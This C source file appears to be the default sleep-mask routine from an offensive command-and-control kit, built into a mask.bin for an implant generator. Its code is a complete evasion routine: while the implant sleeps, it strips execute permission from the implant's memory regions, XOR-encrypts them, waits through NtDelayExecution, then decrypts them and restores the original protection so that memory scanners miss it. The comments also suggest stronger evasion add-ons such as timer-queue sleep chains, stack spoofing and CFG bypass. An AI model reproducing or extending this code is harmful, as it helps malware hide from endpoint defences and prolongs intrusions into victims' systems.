// default_mask.c — Co2H Sleep Mask Kit: default XOR + NtDelayExecution mask.
//
// This is the reference implementation shipped with the kit.
// Compile with build_mask.bat to produce mask.bin, then pass to artifact-gen:
//   artifact-gen ... --mask mask.bin ...
//
// The mask does:
//   1. VirtualProtect each region to PAGE_READWRITE (hide RX from scanners)
//   2. XOR-encrypt each region with the 16-byte key
//   3. Sleep via NtDelayExecution
//   4. XOR-decrypt (symmetric)
//   5. Restore original memory protection
//   6. FlushInstructionCache
//
// You can replace steps 3 with timer-queue APC chains (Ekko/Foliage style),
// add stack spoofing, CFG bypass, etc. — the interface stays the same.

#include "sleep_mask_api.h"

// Entry point — must be the FIRST function in the file so that its address
// is the start of .text (link.exe /ENTRY:sleep_mask_entry).
void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // 1. Change protection to RW (remove Execute — hides from RX scanners).
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            0x04 /* PAGE_READWRITE */, &old_prot);
    }

    // 2. XOR encrypt with 16-byte cyclic key.
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        uint32_t n;
        for (n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 3. Sleep.
    {
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        ctx->NtDelayExecution(FALSE, &delay);
    }

    // 4. XOR decrypt (symmetric — same operation).
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        uint32_t n;
        for (n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // 5. Restore original protection.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush instruction cache so CPU fetches fresh decrypted code.
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}
